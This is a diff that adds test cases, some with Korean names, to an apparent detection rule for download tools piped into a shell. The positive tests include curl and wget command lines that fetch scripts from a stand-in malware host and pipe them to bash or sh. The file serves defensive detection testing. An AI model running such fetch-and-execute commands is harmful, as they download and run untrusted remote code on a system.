@@ -21,3 +21,26 @@ detection:
       - '|bash'
       - '|sh'
   condition: selection_tool and selection_pipe
+tests:
+  positive:
+    - name: curl 파이프 bash
+      event:
+        Image: /bin/sh
+        CommandLine: curl -s http://malware.example/x.sh | bash
+        ParentImage: /bin/bash
+    - name: wget 파이프 sh (공백 없음)
+      event:
+        Image: /bin/sh
+        CommandLine: wget -qO- http://malware.example/x |sh
+        ParentImage: /bin/bash
+  negative:
+    - name: 평범한 헬스체크 curl
+      event:
+        Image: /usr/bin/curl
+        CommandLine: curl -s https://api.example.com/health
+        ParentImage: /usr/sbin/cron
+    - name: 로컬 스크립트를 셸에 파이프 (다운로드 아님)
+      event:
+        Image: /bin/bash
+        CommandLine: cat /opt/setup.sh | bash
+        ParentImage: /bin/bash
